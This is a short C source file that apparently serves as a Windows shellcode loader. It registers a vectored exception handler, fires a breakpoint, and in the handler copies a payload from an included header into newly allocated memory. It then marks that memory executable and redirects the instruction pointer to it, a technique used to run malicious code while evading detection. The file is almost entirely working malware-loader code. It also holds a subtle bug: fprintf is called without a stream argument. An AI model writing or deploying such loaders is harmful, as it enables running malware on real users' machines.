#include <windows.h>
#include <stdio.h>
#include "Payload.h"

LONG WINAPI VehHandler( PEXCEPTION_POINTERS ExceptionInfo ) {
    if ( ExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_BREAKPOINT )
        return EXCEPTION_CONTINUE_SEARCH;

    LPVOID exec_mem = VirtualAlloc( NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( exec_mem == NULL ) {
        printf( "VirtualAlloc failed: %d\n", GetLastError() );
        return EXCEPTION_CONTINUE_SEARCH;
    }

    printf( "[+] Allocated %ld bytes at %p\n", payloadSize, exec_mem );

    memcpy( exec_mem, payload, payloadSize );

    DWORD oldProtect;
    if ( !VirtualProtect( exec_mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( "[-] VirtualProtect failed: %d\n", GetLastError() );
        return EXCEPTION_CONTINUE_SEARCH;
    }

    ExceptionInfo->ContextRecord->Rip = ( DWORD64 )exec_mem;

    return EXCEPTION_CONTINUE_EXECUTION;
}


int main() {

    AddVectoredExceptionHandler( 1, VehHandler );
    __debugbreak();

    return 0;
}